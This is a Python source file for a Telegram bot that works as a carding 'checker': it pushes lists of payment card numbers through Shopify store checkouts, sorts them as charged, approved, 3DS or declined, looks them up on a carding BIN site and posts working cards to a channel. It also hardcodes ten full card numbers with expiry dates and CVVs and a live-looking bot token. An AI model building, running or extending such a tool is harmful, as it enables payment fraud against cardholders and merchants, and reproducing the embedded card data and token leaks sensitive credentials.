import os
import asyncio
import logging
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
from api import process_card, parse_cc_string, extract_clean_response, fetch_products

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8401689004:AAEvNNZQJCoVh6UMwUGrKOUynDPd-1rsPAk")
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1003345433105"))

TEST_CARDS = [
    "5275150060415544|05|27|803",
    "5275150094498722|06|28|271",
    "5597580170432727|02|29|669",
    "4890222002785710|08|29|313",
    "4147342094178599|10|27|885",
    "5275150165633736|11|29|675",
    "5143773871130026|05|26|705",
    "5275150182030312|08|29|950",
    "4031633018355571|06|28|951",
    "4064980980901258|12|30|252",
]

DEAD_KEYWORDS = [
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'url rejected', 'malformed input', 'amount_too_small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'generic_error', 'generic error', 'site not supported',
]

WORKING_KEYWORDS = [
    'card_declined', 'fraud', 'incorrect_zip', 'invalid_cvc', 'invalid_cvv',
    'insufficient_funds', 'otp_required', 'order_placed', 'declined',
    'do_not_honor', 'incorrect_number', 'card_incorrect', 'expired_card',
    'pickup_card', 'restricted_card', 'stolen_card', 'lost_card',
    'card_velocity_exceeded', 'transaction_not_allowed', 'invalid_expiry',
    'processing_error', 'call_issuer', 'try_again_later', 'fraudulent',
    'security_violation', 'blocked', 'bad_cvv', 'cvv_fail',
    'authentication_required', 'mismatched_bill', 'charged', 'approved',
    'wrong_number', 'incorrect number', 'card incorrect',
]


def classify_result(success, message):
    msg = message.lower()
    if 'order_placed' in msg:
        return 'charged'
    if 'otp_required' in msg:
        return 'tds'
    if any(k in msg for k in ['approved', 'insufficient', 'cvv', 'cvc', 'zip',
                               'incorrect_zip', 'invalid_cvv', 'invalid_cvc',
                               'insufficient_funds']):
        return 'approved'
    if success:
        return 'declined'
    for kw in WORKING_KEYWORDS:
        if kw in msg:
            return 'declined'
    if any(k in msg for k in DEAD_KEYWORDS):
        return 'error'
    return 'error'


def approved_message(message):
    msg = message.lower()
    if 'insufficient' in msg:
        return 'INSUFFICIENT_FUNDS'
    if 'invalid_cvv' in msg or ('cvv' in msg and 'invalid' in msg):
        return 'INVALID_CVV'
    if 'invalid_cvc' in msg or ('cvc' in msg and 'invalid' in msg):
        return 'INVALID_CVC'
    if 'incorrect_zip' in msg or 'zip' in msg:
        return 'INCORRECT_ZIP'
    if 'cvv' in msg:
        return 'INVALID_CVV'
    if 'cvc' in msg:
        return 'INVALID_CVC'
    clean = extract_clean_response(message)
    return clean.upper().replace(' ', '_')


async def get_bin_info(cc):
    try:
        bin6 = cc[:6]
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"https://bins.antipublic.cc/bins/{bin6}", timeout=aiohttp.ClientTimeout(total=5)
            ) as res:
                if res.status == 200:
                    data = await res.json()
                    return {
                        'brand': data.get('brand', 'UNKNOWN'),
                        'bank': data.get('bank', 'UNKNOWN'),
                        'country': data.get('country_name', 'UNKNOWN'),
                        'level': data.get('level', 'N/A'),
                        'type': data.get('type', 'N/A'),
                        'flag': data.get('country_flag', ''),
                    }
    except Exception:
        pass
    return {'brand': 'UNKNOWN', 'bank': 'UNKNOWN', 'country': 'UNKNOWN',
            'level': 'N/A', 'type': 'N/A', 'flag': ''}


def fmt_price(price, currency):
    try:
        if not price or price == '0':
            return "Free"
        return f"${float(price):.2f} {currency}"
    except Exception:
        return f"${price} {currency}"


def fmt_info(brand, type_cc, level):
    if level and level != 'N/A':
        return f"{brand} - {type_cc.upper()} - {level.upper()}"
    return f"{brand} - {type_cc.upper()}"


async def run_with_retry(parts, site, proxy_str=None, max_retries=3):
    last_success, last_msg, last_gate, last_price, last_cur = False, 'ERROR', '', '0', 'USD'
    for attempt in range(max_retries):
        try:
            success, message, gateway, price, currency = await process_card(
                parts['cc'], parts['mes'], parts['ano'], parts['cvv'], site, None, proxy_str
            )
            last_success, last_msg, last_gate, last_price, last_cur = (
                success, message, gateway, price, currency
            )
            category = classify_result(success, message)
            if category != 'error' or any(k in message.lower() for k in WORKING_KEYWORDS):
                return success, message, gateway, price, currency, category
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
        except Exception as e:
            last_msg = f"Error: {str(e)}"
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
    return last_success, last_msg, last_gate, last_price, last_cur, 'error'


def build_result_text(cc_string, category, clean, price_fmt, info_str, bank, country, flag):
    if category == 'charged':
        status = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥"
    elif category == 'approved':
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif category == 'tds':
        status = "𝟑𝐃𝐒 ❎"
    elif category == 'declined':
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    else:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    text = (
        f"ア 𝐂𝐚𝐫𝐝 ➜ <code>{cc_string}</code>\n"
        f"カ 𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {status}\n"
        f"ツ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {clean}\n"
        f"キ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➜ 𝐀𝐮𝐭𝐨 𝐒𝐡𝐨𝐩𝐢𝐟𝐲\n"
        f"千 𝐏𝐫𝐢𝐜𝐞 ➜ {price_fmt}\n"
        f"━━━━━━━━━━━━━\n"
        f"零 𝙄𝙣𝙛𝙤 ➜ {info_str}\n"
        f"零 𝘽𝙖𝙣𝙠 ➜ {bank}\n"
        f"零 𝘾𝙤𝙪𝗻𝘁𝗿𝐲 ➜ {country} {flag}\n"
        f"━━━━━━━━━━━━━\n"
        f"力 𝐃𝐞𝐯 ➜ @Xoarch"
    )
    return text


# ─── Bot Commands ───────────────────────────────────────────


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("𝐂𝐡𝐞𝐜𝐤𝐞𝐫 🔍", callback_data="menu_checker"),
         InlineKeyboardButton("𝐒𝐢𝐭𝐞 🌐", callback_data="menu_site")],
        [InlineKeyboardButton("𝐇𝐞𝐥𝐩 ❓", callback_data="menu_help")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "███████╗██╗  ██╗ ██████╗ ██████╗ ██╗███████╗██╗   ██╗\n"
        "██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██╔════╝╚██╗ ██╔╝\n"
        "███████╗███████║██║   ██║██████╔╝██║█████╗   ╚████╔╝ \n"
        "╚════██║██╔══██║██║   ██║██╔═══╝ ██║██╔══╝    ╚██╔╝  \n"
        "███████║██║  ██║╚██████╔╝██║     ██║██║        ██║   \n"
        "╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝        ╚═╝   \n\n"
        "𝐖𝐞𝐥𝐜𝐨𝐦𝐞! Select an option below 👇",
        reply_markup=reply_markup,
    )


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "<b>𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>\n\n"
        "/start - Main menu\n"
        "/chk &lt;cc|mm|yy|cvv&gt; &lt;site&gt; - Check single card\n"
        "/mass - Mass check (reply to a file with cards)\n"
        "/site &lt;url&gt; - Check if a site is alive\n"
        "/msite - Mass site check (reply to a file)\n"
        "/bin &lt;bin6&gt; - BIN lookup\n"
        "/help - Show this message\n\n"
        "<b>𝐅𝐨𝐫𝐦𝐚𝐭𝐬:</b>\n"
        "Card: <code>cc_number|mm|yy|cvv</code>\n"
        "Site: <code>https://example.com</code>\n\n"
        "𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await (update.message or update.callback_query.message).reply_text(text, parse_mode="HTML")


async def chk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2:
        await update.message.reply_text(
            "Usage: <code>/chk cc|mm|yy|cvv site_url</code>", parse_mode="HTML"
        )
        return

    cc_string = context.args[0]
    site = context.args[1]
    if not site.startswith('http'):
        site = 'https://' + site

    msg = await update.message.reply_text("𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠... ⏳")

    try:
        parts = parse_cc_string(cc_string)
    except ValueError as e:
        await msg.edit_text(f"Invalid format: {e}")
        return

    success, message, gateway, price, currency, category = await run_with_retry(parts, site)
    appr_clean = approved_message(message) if category == 'approved' else None
    clean = appr_clean if appr_clean else extract_clean_response(message)

    if category == 'charged':
        clean = 'ORDER_PLACED'
    elif category == 'tds':
        clean = 'OTP_REQUIRED'

    bin_info = await get_bin_info(parts['cc'])
    price_fmt = fmt_price(price, currency)
    info_str = fmt_info(bin_info['brand'], bin_info['type'], bin_info['level'])

    result_text = build_result_text(
        cc_string, category, clean, price_fmt, info_str,
        bin_info['bank'], bin_info['country'], bin_info['flag']
    )

    await msg.edit_text(result_text, parse_mode="HTML")

    if category in ('charged', 'approved', 'tds'):
        try:
            await context.bot.send_message(
                chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to post to channel: {e}")


async def mass_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "Usage: <code>/mass site_url</code>\n"
            "Then send a .txt file with cards (one per line) as a reply, "
            "or send cards as text lines after the command.",
            parse_mode="HTML",
        )
        return

    site = context.args[0]
    if not site.startswith('http'):
        site = 'https://' + site

    cards = []

    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            file = await update.message.reply_to_message.document.get_file()
            data = await file.download_as_bytearray()
            cards = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if l.strip()]
        elif update.message.reply_to_message.text:
            cards = [l.strip() for l in update.message.reply_to_message.text.splitlines() if '|' in l]

    if len(context.args) > 1:
        for arg in context.args[1:]:
            if '|' in arg:
                cards.append(arg)

    if not cards:
        await update.message.reply_text("No cards found. Send a file or card lines.")
        return

    msg = await update.message.reply_text(
        f"𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(cards)} cards... ⏳"
    )

    stats = {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0}
    hits = []

    for i, cc_string in enumerate(cards):
        try:
            parts = parse_cc_string(cc_string)
        except Exception:
            stats['error'] += 1
            continue

        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
        stats[category] += 1

        if category in ('charged', 'approved', 'tds'):
            appr_clean = approved_message(message) if category == 'approved' else None
            clean = appr_clean if appr_clean else extract_clean_response(message)
            if category == 'charged':
                clean = 'ORDER_PLACED'
            elif category == 'tds':
                clean = 'OTP_REQUIRED'

            bin_info = await get_bin_info(parts['cc'])
            price_fmt = fmt_price(price, currency)
            info_str = fmt_info(bin_info['brand'], bin_info['type'], bin_info['level'])
            result_text = build_result_text(
                cc_string, category, clean, price_fmt, info_str,
                bin_info['bank'], bin_info['country'], bin_info['flag']
            )
            hits.append(result_text)

            try:
                await context.bot.send_message(
                    chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML"
                )
            except Exception as e:
                logger.error(f"Channel post error: {e}")

        if (i + 1) % 10 == 0:
            try:
                await msg.edit_text(
                    f"𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {i + 1}/{len(cards)} checked ⏳"
                )
            except Exception:
                pass

    summary = (
        f"<b>𝐂𝐀𝐑𝐃 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬: {len(cards)}\n\n"
        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']} 🔥\n"
        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']} ✅\n"
        f"𝟑𝐃𝐒: {stats['tds']} ❎\n"
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']} ❌\n"
        f"𝐄𝐫𝐫𝐨𝐫𝐬: {stats['error']} ⚠️\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await msg.edit_text(summary, parse_mode="HTML")

    try:
        await context.bot.send_message(
            chat_id=CHANNEL_ID, text=summary, parse_mode="HTML"
        )
    except Exception as e:
        logger.error(f"Channel summary error: {e}")


async def site_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/site url</code>", parse_mode="HTML"
        )
        return

    site = context.args[0]
    if not site.startswith('http'):
        site = 'https://' + site

    msg = await update.message.reply_text("𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐬𝐢𝐭𝐞... ⏳")

    test_cc = TEST_CARDS[0]
    parts = parse_cc_string(test_cc)

    try:
        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
        msg_lower = message.lower()
        if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
            await msg.edit_text(f"✅ <b>WORKING</b> ➜ <code>{site}</code>", parse_mode="HTML")
        else:
            await msg.edit_text(f"❌ <b>DEAD</b> ➜ <code>{site}</code>", parse_mode="HTML")
    except Exception:
        await msg.edit_text(f"❌ <b>DEAD</b> ➜ <code>{site}</code>", parse_mode="HTML")


async def msite_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sites = []

    if update.message.reply_to_message:
        if update.message.reply_to_message.document:
            file = await update.message.reply_to_message.document.get_file()
            data = await file.download_as_bytearray()
            sites = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if l.strip()]
        elif update.message.reply_to_message.text:
            sites = [l.strip() for l in update.message.reply_to_message.text.splitlines() if l.strip()]

    if not sites:
        default_path = os.path.join(os.path.dirname(__file__), 'sites.txt')
        if os.path.isfile(default_path):
            with open(default_path, 'r', encoding='utf-8') as f:
                sites = [l.strip() for l in f if l.strip()]

    if not sites:
        await update.message.reply_text(
            "No sites found. Reply to a file with /msite or place sites.txt next to bot.py"
        )
        return

    msg = await update.message.reply_text(f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(sites)} sites... ⏳")

    working, dead = [], []
    for i, site in enumerate(sites):
        if not site.startswith('http'):
            site = 'https://' + site
        test_cc = TEST_CARDS[i % len(TEST_CARDS)]
        parts = parse_cc_string(test_cc)
        try:
            success, message, gateway, price, currency, category = await run_with_retry(parts, site)
            msg_lower = message.lower()
            if any(kw in msg_lower for kw in WORKING_KEYWORDS) or category != 'error':
                working.append(site)
            else:
                dead.append(site)
        except Exception:
            dead.append(site)

        if (i + 1) % 5 == 0:
            try:
                await msg.edit_text(f"𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬: {i + 1}/{len(sites)} ⏳")
            except Exception:
                pass

    summary = (
        f"<b>𝐒𝐈𝐓𝐄 𝐒𝐄𝐒𝐒𝐈𝐎𝐍 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐓𝐨𝐭𝐚𝐥: {len(sites)}\n\n"
        f"𝐖𝐨𝐫𝐤𝐢𝐧𝐠: {len(working)} ✅\n"
        f"𝐃𝐞𝐚𝐝: {len(dead)} ❌\n"
        f"━━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await msg.edit_text(summary, parse_mode="HTML")

    if working:
        working_text = "\n".join([f"✅ {s}" for s in working])
        await update.message.reply_text(
            f"<b>𝐖𝐨𝐫𝐤𝐢𝐧𝐠 𝐒𝐢𝐭𝐞𝐬:</b>\n{working_text}", parse_mode="HTML"
        )


async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "Usage: <code>/bin 123456</code>", parse_mode="HTML"
        )
        return

    bin6 = context.args[0][:6]
    info = await get_bin_info(bin6)

    text = (
        f"<b>𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩 ➜ {bin6}</b>\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐁𝐫𝐚𝐧𝐝: {info['brand']}\n"
        f"𝐓𝐲𝐩𝐞: {info['type']}\n"
        f"𝐋𝐞𝐯𝐞𝐥: {info['level']}\n"
        f"𝐁𝐚𝐧𝐤: {info['bank']}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {info['country']} {info['flag']}\n"
        f"━━━━━━━━━━━━━\n"
        f"𝐃𝐞𝐯 ➜ @Xoarch"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc or not doc.file_name.endswith('.txt'):
        return

    file = await doc.get_file()
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode('utf-8', errors='ignore').splitlines() if l.strip()]

    if not lines:
        await update.message.reply_text("File is empty.")
        return

    if '|' in lines[0]:
        await update.message.reply_text(
            f"Detected {len(lines)} cards. Use:\n"
            f"<code>/mass site_url</code> (reply to this file)",
            parse_mode="HTML",
        )
    else:
        await update.message.reply_text(
            f"Detected {len(lines)} sites. Use:\n"
            f"<code>/msite</code> (reply to this file)",
            parse_mode="HTML",
        )


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "menu_checker":
        await query.message.reply_text(
            "<b>𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐌𝐨𝐝𝐞</b>\n\n"
            "Single: <code>/chk cc|mm|yy|cvv site_url</code>\n"
            "Mass: <code>/mass site_url</code> (reply to card file)\n",
            parse_mode="HTML",
        )
    elif query.data == "menu_site":
        await query.message.reply_text(
            "<b>𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤𝐞𝐫</b>\n\n"
            "Single: <code>/site url</code>\n"
            "Mass: <code>/msite</code> (reply to site file)\n",
            parse_mode="HTML",
        )
    elif query.data == "menu_help":
        await help_cmd(update, context)


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("chk", chk_cmd))
    app.add_handler(CommandHandler("mass", mass_cmd))
    app.add_handler(CommandHandler("site", site_cmd))
    app.add_handler(CommandHandler("msite", msite_cmd))
    app.add_handler(CommandHandler("bin", bin_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    app.add_handler(CallbackQueryHandler(callback_handler))

    logger.info("Bot started polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
